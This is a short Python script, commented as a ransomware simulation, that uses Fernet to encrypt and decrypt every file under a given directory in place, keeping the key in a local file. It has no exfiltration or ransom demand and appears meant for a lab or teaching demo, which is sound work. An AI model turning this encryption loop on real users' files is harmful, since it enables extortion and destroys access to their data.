import os
from pathlib import Path
from cryptography.fernet import Fernet

DUMMY_FILES_DIR = "dummy_files"

KEY_FILE = "secret.key"
STATUS_FILE = "encryption_status.txt"


def is_encrypted():
    if os.path.exists(STATUS_FILE):
        with open(STATUS_FILE, "r") as file:
            return file.read().strip() == "encrypted"
    return False


def set_encryption_status(status):
    with open(STATUS_FILE, "w") as file:
        file.write(status)


def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)


def load_key():
    if not os.path.exists(KEY_FILE):
        raise FileNotFoundError("Key file not found. Please generate one")
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()


# Function for ransomware simulation
def encrypt_file(file_path):
    key = load_key()
    fernet = Fernet(key)

    with open(file_path, "rb") as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, "wb") as file:
        file.write(encrypted)


def decrypt_file(file_path):
    key = load_key()
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted = file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file_path, "wb") as file:
        file.write(decrypted)


def encrypt_files(directory):
    for file in Path(directory).rglob("*"):
        encrypt_file(file)


def decrypt_files(directory):
    for file in Path(directory).rglob("*"):
        decrypt_file(file)
